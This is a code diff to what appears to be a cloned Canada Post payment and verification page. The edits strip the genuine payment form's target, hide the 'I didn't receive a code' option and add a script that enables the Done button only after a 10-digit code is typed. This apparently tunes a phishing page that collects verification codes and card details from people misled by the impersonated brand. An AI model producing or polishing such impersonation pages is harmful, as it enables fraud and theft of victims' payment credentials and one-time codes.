@@ -4635,7 +4635,7 @@
                <input type="text" class=" p-2 mx-5 rounded rounded-1 border border-1 border-dark" id="code" name="code" style="font-size: 25px; font-weight: bold; text-align: center;">
                
                   <div class="mt-4 mx-5 " bis_skin_checked="1">
-                    <button name="verification" style="background-color: #0467c6 !important;" type="submit" id="done" class="btn m-t-2 btn-block w-100 btn-info p-3 h-75">
+                    <button disabled name="verification" style="background-color: #0467c6 !important;" type="submit" id="done" class="btn m-t-2 btn-block w-100 btn-info p-3 h-75">
                       <div class="d-flex justify-content-between align-items-center text-white" bis_skin_checked="1"><span class="tw-icon tw-icon-lock pull-left " aria-hidden="true" role="presentation">
                         <svg width="24" height="24" fill="currentColor" focusable="false"><path d="M11 17v-3h2v3h-2z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M12 1a6.5 6.5 0 00-6.5 6.5V9H3v10a3 3 0 003 3h12a3 3 0 003-3V9h-2.5V7.5A6.5 6.5 0 0012 1zm4.5 8V7.5a4.5 4.5 0 10-9 0V9h9zM5 11v8a1 1 0 001 1h12a1 1 0 001-1v-8H5z"></path></svg>
                       </span>Done<span class="pull-right btn-loader invisible"></span></div>
@@ -4643,7 +4643,7 @@
                   </div>
                   </form>
 
-               <div class="text-center mb-2 "> <a type="button" class="btn btn-link mt-3  text-info">I didn’t receive a code</a></div></div></div></div>
+               <div class="text-center mb-2 "> <a type="button" class="btn btn-link mt-3  text-info"></a></div></div></div></div>
 
                   
                 </div>
@@ -4699,7 +4699,7 @@
         
         
         <div class="cp-iframe-loader">
-          <form name="init__payment" id="init__payment" action="https://payment.canadapost.ca/payment" target="cpwa__frame" method="post"><input name="p" value="?" type="hidden"><input id="cpwa_button" class="cp-iframe-loader-btn" type="submit" value="submit">
+          <form name="init__payment" id="init__payment" ><input name="p" value="?" type="hidden"><input id="cpwa_button" class="cp-iframe-loader-btn" type="submit" value="submit">
           </form></div></div><div class="modal fade view-return-policy" id="viewReturnPolicyModal" role="dialog" aria-hidden="false" tabindex="-1"><div class="modal-dialog"><!-- Modal content--><div class="modal-content"><button type="button" class="close-btn close-facet-modal" id="closeModal" data-mz-close-modal="" data-dismiss="modal" aria-label="Close"><img src="" alt="Close"></button><div class="modal-body"><h2>Return policy</h2><div class="policy-content"><p>If you are not satisfied with your Canada Post purchase, please call 1-877-632-6347 within 10 calendar days of receipt to request a return authorization number. If the item is returnable, unopened, and sent back in its original wrapping along with your receipt, you will be refunded in your original method of payment.You must return unwanted items to the Canada Post warehouse within 30 calendar days of the issuance of your return authorization number. All products must be in their original packaging.</p></div></div></div></div></div></div><footer class="mz-pagefooter cp-foundation"><cpc-footer class="cpc-component"><div id="cpc-main-footer" class="cpc-footer-container"><div class="cpc-footer">
     <div class="noindex">
     <section class="footer-l1" role="navigation" aria-label="Footer navigation"> 
@@ -5149,6 +5149,7 @@ $(document).ready(function(){
 
     // Get a reference to the input element
 const input = document.getElementById('code');
+const doneButton = document.querySelector('#done');
 // change size
 input.style.fontSize = '25px';
 // change size
@@ -5169,8 +5170,15 @@ input.addEventListener('input', (event) => {
 
   // Update the input value with the formatted text
   event.target.value = formattedText;
-});
 
+  // Disable the done button if input has less than 10 digits
+  if (inputText.length < 10) {
+    doneButton.disabled = true;
+ 
+  } else {
+    doneButton.disabled = false;
+  }
+});
   
   // verification input CARD paiment
   $('.input-group-card').keyup(function(){
